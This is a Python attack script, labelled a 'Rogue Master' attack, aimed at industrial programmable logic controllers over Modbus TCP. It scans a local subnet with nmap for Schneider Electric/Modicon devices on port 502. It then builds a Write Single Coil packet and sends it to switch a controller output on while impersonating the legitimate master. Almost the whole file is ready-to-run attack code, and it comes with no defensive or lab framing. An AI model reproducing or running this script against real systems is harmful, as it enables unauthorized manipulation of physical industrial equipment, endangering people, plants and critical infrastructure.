import socket
import struct
import time
import subprocess  # For finding IP address if needed
import re  # For IP address validation

# Configuration
PLC_IP = None  # Will be discovered if not set
PLC_PORT = 502  # Standard Modbus TCP port
ROGUE_MASTER_IP = "192.168.1.100"  # IP address of the machine running this script (Rogue Master)
ROGUE_MASTER_PORT = 502  # Port the rogue master listens on (can be the same as PLC port)
COIL_TO_CONTROL = 0  # Example: Coil 0 (adjust based on your application)
MALICIOUS_VALUE = 1  # Example: Turn the coil ON (adjust based on your application)
TRANSACTION_ID = 1  # Example: Modbus transaction ID, increment for each request
PROTOCOL_ID = 0  # Modbus Protocol ID
UNIT_ID = 1  # Modbus Unit ID (Slave Address)


def find_plc_ip():
    """
    Attempts to discover the PLC's IP address using nmap.
    Requires nmap to be installed and in the system's PATH.
    """
    try:
        # You might need to adapt this nmap command based on your network.
        # This example scans the 192.168.1.0/24 network for devices with open port 502 (Modbus).
        result = subprocess.run(['nmap', '-p', '502', '192.168.1.0/24'], capture_output=True, text=True)
        output = result.stdout

        # Look for lines containing the PLC's MAC address (if known) or common PLC names.
        # Adapt these keywords to match your PLC's fingerprint.  This is *crucial*.
        keywords = ["Schneider Electric", "Modicon", "PLC"] # Adjust this list
        for line in output.splitlines():
            if any(keyword in line for keyword in keywords):
                # Extract IP address using regex.  Be specific to avoid false positives.
                match = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', line)
                if match:
                    ip_address = match.group(1)
                    # Basic IP address validation
                    if validate_ip(ip_address):
                        return ip_address
                    else:
                        print(f"Invalid IP address found: {ip_address}")

        print("PLC IP address not found using nmap. Please specify PLC_IP manually.")
        return None
    except FileNotFoundError:
        print("nmap not found. Please install nmap or specify PLC_IP manually.")
        return None
    except Exception as e:
        print(f"Error during IP discovery: {e}")
        return None


def validate_ip(ip_address):
    """
    Basic IP address validation using regex.
    """
    pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    if re.match(pattern, ip_address):
        parts = ip_address.split('.')
        for part in parts:
            if not 0 <= int(part) <= 255:
                return False
        return True
    else:
        return False



def create_modbus_write_single_coil_request(transaction_id, protocol_id, length, unit_id, coil_address, value):
    """
    Creates a Modbus TCP Write Single Coil request.

    Args:
        transaction_id (int): Transaction identifier.
        protocol_id (int): Protocol identifier (0 for Modbus).
        length (int): Length of the remaining packet (bytes). Should be 6 in this case.
        unit_id (int): Unit identifier (Slave Address).
        coil_address (int): Address of the coil to write to.
        value (int): 0 for OFF, non-zero for ON.  Use 0x0000 or 0xFF00 instead of 0 or 1.

    Returns:
        bytes: The Modbus TCP request message.
    """

    function_code = 5  # Write Single Coil Function Code

    # Pack the data into a byte string using struct.pack
    # > for big-endian
    # H for unsigned short (2 bytes)
    # B for unsigned char (1 byte)
    message = struct.pack(">HHHBHH", transaction_id, protocol_id, length, unit_id, function_code, coil_address)

    # Pack the coil value (0x0000 for OFF, 0xFF00 for ON)
    if value:  # ON
        message += struct.pack(">H", 0xFF00)
    else:  # OFF
        message += struct.pack(">H", 0x0000)

    return message


def send_modbus_request(ip, port, request):
    """
    Sends a Modbus TCP request to the specified IP address and port.

    Args:
        ip (str): IP address of the Modbus server.
        port (int): Port number of the Modbus server.
        request (bytes): The Modbus TCP request message.
    """
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((ip, port))
            s.sendall(request)
            response = s.recv(1024)  # Receive the response (important for error handling)
            print(f"Received response: {response.hex()}") # Print the response in hex for debugging.
            return response

    except socket.error as e:
        print(f"Socket error: {e}")
        return None
    except Exception as e:
        print(f"An error occurred: {e}")
        return None


def rogue_master_attack(plc_ip, plc_port, coil_address, value):
    """
    Performs the Rogue Master attack by sending a malicious Modbus request to the PLC.

    Args:
        plc_ip (str): IP address of the PLC.
        plc_port (int): Port number of the PLC.
        coil_address (int): Address of the coil to control.
        value (int): Value to write to the coil (0 or 1).
    """
    global TRANSACTION_ID  # Access the global variable

    # 1. Craft the malicious Modbus request
    request = create_modbus_write_single_coil_request(
        TRANSACTION_ID, PROTOCOL_ID, 6, UNIT_ID, coil_address, value
    )

    # 2. Send the request to the PLC, impersonating the legitimate master
    print(f"Sending malicious Modbus request to {plc_ip}:{plc_port}")
    response = send_modbus_request(plc_ip, plc_port, request)

    if response:
        print("Malicious request sent successfully (or at least, no error occurred sending).  Inspect response closely.")
    else:
        print("Failed to send malicious request.")

    TRANSACTION_ID += 1 # Increment for the next request, if any



def main():
    global PLC_IP  # Allows modification of the global PLC_IP

    # 1. Discover the PLC IP address if not set.
    if not PLC_IP:
        PLC_IP = find_plc_ip()
        if not PLC_IP:
            print("PLC IP address not found. Please specify PLC_IP manually in the script.")
            return

    print(f"Using PLC IP: {PLC_IP}")

    # 2. Perform the Rogue Master attack.
    print("Starting Rogue Master attack...")
    rogue_master_attack(PLC_IP, PLC_PORT, COIL_TO_CONTROL, MALICIOUS_VALUE)  # Example: Toggle Coil 0 ON

    # Add additional attacks or logic here, such as sending more commands or monitoring network traffic.
    # Example:  rogue_master_attack(PLC_IP, PLC_PORT, COIL_TO_CONTROL, 0)  # Toggle Coil 0 OFF


if __name__ == "__main__":
    main()